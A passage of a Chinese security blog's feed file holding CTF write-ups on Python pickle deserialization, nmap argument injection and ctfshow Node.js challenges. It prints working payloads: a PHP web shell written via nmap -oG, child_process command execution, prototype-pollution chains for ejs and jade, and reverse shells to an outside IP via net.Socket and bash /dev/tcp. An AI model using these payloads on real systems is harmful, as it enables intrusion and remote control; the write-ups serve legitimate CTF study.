class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>)()</span><br><span class="line">builtins=dict_get(glo_dic,<span class="string">&#x27;builtins&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(builtins,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;print(&quot;123&quot;)&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><p><img src="1613830882202.png" alt="1613830882202"></p><p>使用参考 <a href="https://xz.aliyun.com/t/7436#toc-13">https://xz.aliyun.com/t/7436#toc-13</a></p><h2 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h2><ul><li><p><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a> (比较详细的一篇文章)</p></li><li><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a> 很深入的一篇文章</p></li><li><p><a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/">Python反序列化漏洞的花式利用</a> 还有一些姿势没有研究</p></li><li><p><a href="https://zhuanlan.zhihu.com/p/25981037">Python Pickle的任意代码执行漏洞实践和Payload构造</a>  bit4@<a href="https://link.zhihu.com/?target=http://www.polaris-lab.com/">勾陈安全实验室</a> </p></li><li><p><a href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a> 内含完整pickle v0指令</p></li><li><p><a href="https://www.anquanke.com/post/id/188981">Python pickle 反序列化实例分析</a></p></li><li><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> P牛opcode编写过程</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pickle反序列化 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap参数注入</title>
      <link href="2021/02/15/nmap%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/"/>
      <url>2021/02/15/nmap%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><p>参考资料 </p><p> <a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></p><p><a href="https://www.anquanke.com/post/id/107336">https://www.anquanke.com/post/id/107336</a></p><p><a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><h2 id="nmap参数注入"><a href="#nmap参数注入" class="headerlink" title="nmap参数注入"></a>nmap参数注入</h2><h3 id="Online-Tool"><a href="#Online-Tool" class="headerlink" title="Online Tool"></a>Online Tool</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>-oG参数</code>:</p><p> <img src="image.png" alt="image.png"> </p><p>payload: <code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG shell.php &#39;</code></p><p><code>nmap -T5 -sT -Pn --host-timeout 2 -F &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG shell.php</code></p><h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p><code>payload &#39; &lt;?=eval($_POST[&quot;hack&quot;]);?&gt; -oG shell.phtml &#39;</code></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 参数注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web入门 Node WP</title>
      <link href="2021/02/15/nodejs/"/>
      <url>2021/02/15/nodejs/</url>
      
        <content type="html"><![CDATA[<h2 id="web334-little-trick"><a href="#web334-little-trick" class="headerlink" title="web334 little trick"></a>web334 little trick</h2><p>考察js特性: 参考 <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">toUpperCase():</span><br><span class="line">ı  ==&gt;I</span><br><span class="line">ſ  ==&gt;S</span><br><span class="line"></span><br><span class="line">toLowerCase():</span><br><span class="line">İ  ==&gt;i</span><br><span class="line">K  ==&gt;k</span><br></pre></td></tr></table></figure><h2 id="web335-rce"><a href="#web335-rce" class="headerlink" title="web335 rce"></a>web335 rce</h2><p>nodeJs命令执行,可以读文件,但是没找到flag</p><p><code>require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;, &#39;utf-8&#39;);</code></p><p>尝试执行系统命令<code> require(&#39;child_process&#39;).execSync(&#39;whoami&#39;);</code></p><p><code>?eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;);</code></p><p><code> require(&#39;child_process&#39;).spawnSync(&#39;whoami&#39;);</code></p><h2 id="web336-rce-bypas"><a href="#web336-rce-bypas" class="headerlink" title="web336 rce bypas"></a>web336 rce bypas</h2><p>有绕过,可以先读代码</p><p><code>?eval=__filename</code>读当前文件路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">var</span> router = express.Router(); </span><br><span class="line"><span class="comment">/* GET home page. */</span> </span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123; </span><br><span class="line">    res.type(<span class="string">&#x27;html&#x27;</span>); </span><br><span class="line">    <span class="keyword">var</span> evalstring = req.query.eval; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(evalstring)==<span class="string">&#x27;string&#x27;</span> &amp;&amp; evalstring.search(<span class="regexp">/exec|load/i</span>)&gt;<span class="number">0</span>)&#123; </span><br><span class="line">        res.render(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">title</span>: <span class="string">&#x27;tql&#x27;</span>&#125;); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="built_in">eval</span>(evalstring) &#125;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;); </span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>ban了exec和load , nodejs引入函数不仅能package.function还能 package[‘function’]</p><p>bypass: <code>require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;, &#39;utf-8&#39;);</code></p><h2 id="web337-js数组"><a href="#web337-js数组" class="headerlink" title="web337 js数组"></a>web337 js数组</h2><p>给了代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.query.a;</span><br><span class="line">  <span class="keyword">var</span> b = req.query.b;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">  res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1613016506250.png" alt="1613016506250"></p><p>如上图,js中两个数组是不能直接用===判断是否相等的.<br>参考 <a href="https://www.cnblogs.com/chri330dj/p/12420458.html">https://www.cnblogs.com/chri330dj/p/12420458.html</a><br>而且<code>typeof(array+string)=string</code><br>所以传数组参数可以绕过<code>?a[0]=&amp;b[0]=1</code></p><h2 id="web338-原型链污染-merage"><a href="#web338-原型链污染-merage" class="headerlink" title="web338 原型链污染 merage"></a>web338 原型链污染 merage</h2><p>routes/login.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="built_in">JSON</span>.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>getFlag条件是<code>secert.ctfshow===&#39;36dboy&#39;</code> , 跟踪到<code>utils/common</code> , 发现是  <code>Object recursive merge</code> 的一段代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload : <code>&#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</code>, 通过污染<code>&#123;&#125;</code>,来达到条件</p><p><img src="1613018214898.png" alt="1613018214898"></p><h2 id="web339-RCE"><a href="#web339-RCE" class="headerlink" title="web339 RCE"></a>web339 RCE</h2><p>发现this变量似乎指向了一个全局空间</p><p> 面向对象语言中 this 表示当前对象的一个引用 , <del>考虑把<code>user.__proto__.ctfshow</code>赋值为<code>this.flag</code></del></p><p>login.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  <span class="built_in">console</span>.log(query)</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===flag)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="built_in">JSON</span>.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>secert.ctfshow===flag</code>是无法实现了. </p><p>在api.js , 可以通过参数污染控制query,然后实现RCE</p><p><code>Function</code>:<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(query);</span><br><span class="line">  res.render(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>payload: 反弹shell (下面这个一直没成功)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(1001,&#x27;91.67.943.121&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&quot;</span>&#125;&#125;</span><br><span class="line"><span class="comment">// node 反弹shell</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);<span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();client.connect(<span class="number">1001</span>,<span class="string">&quot;91.67.943.121&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);<span class="keyword">return</span> <span class="regexp">/a/</span>; &#125;)();</span><br></pre></td></tr></table></figure><p>后来在P牛博客看到, <a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html">https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html</a></p><p><img src="1613041146851.png" alt="1613041146851"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;var net = process.mainModule.constructor._load(&#x27;net&#x27;),cp = process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(1001,&#x27;91.67.943.121&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后再次尝试反弹shell.</p><p><img src="1613045113959.png" alt="1613045113959"></p><p>Express运行环境和node shell环境下结果不一致//坑死在这里了</p><h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>关键代码变成了下面的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.userinfo = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.isVIP = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAuthor = <span class="literal">false</span>;   </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.copy(user.userinfo,req.body); <span class="comment">// 危</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;user.userinfo&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span>(user.userinfo.isAdmin)&#123;</span><br><span class="line">   res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>不能直接修改isAdmin的值,但是可以找两次原型污染query</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;var net = process.mainModule.constructor._load(&#x27;net&#x27;),cp = process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(1001,&#x27;91.67.943.121&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="web341-ejs-RCE"><a href="#web341-ejs-RCE" class="headerlink" title="web341 ejs RCE"></a>web341 ejs RCE</h2><p>ejs模板引擎的原型链污染RCE reference: <a href="https://xz.aliyun.com/t/6113">https://xz.aliyun.com/t/6113</a></p><p>污染最上层就能影响到整个模板.还是挺神奇的.</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/91.67.943.121/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>以后再好好审计研究一下.</p><h2 id="342"><a href="#342" class="headerlink" title="342"></a>342</h2><p>app.js 可以看到模板引擎换成了jade, 然后 <a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a> 这篇文章里面找到一个payload,失败了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.engine(<span class="string">&#x27;jade&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;jade&#x27;</span>).__express); </span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;jade&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;console.log(global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/91.67.943.121/6666 0&gt;&amp;1\&quot;&#x27;))&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>Nu1L战队搜到的一条链,可惜也失败了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;self&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;2,jade_debug[0].filename));return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/91.67.943.121/6666 0&gt;&amp;1\&quot;&#x27;);//&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><hr><p>分割线,2.22来填坑了.</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/91.67.943.121/6666 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>payload分析过程:</p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/</a></p><h2 id="344-nodejs特性"><a href="#344-nodejs特性" class="headerlink" title="344 nodejs特性"></a>344 nodejs特性</h2><p>参考羽师傅wp <a href="https://blog.csdn.net/miuzzx/article/details/111780832">https://blog.csdn.net/miuzzx/article/details/111780832</a></p><p> ?query={“name”:”admin”&amp;query=”password”:”%63tfshow”&amp;query=”isVIP”:true}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 安全 </category>
          
          <category> CTFSHOW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF2019枯燥的抽奖-PHP伪随机数问题</title>
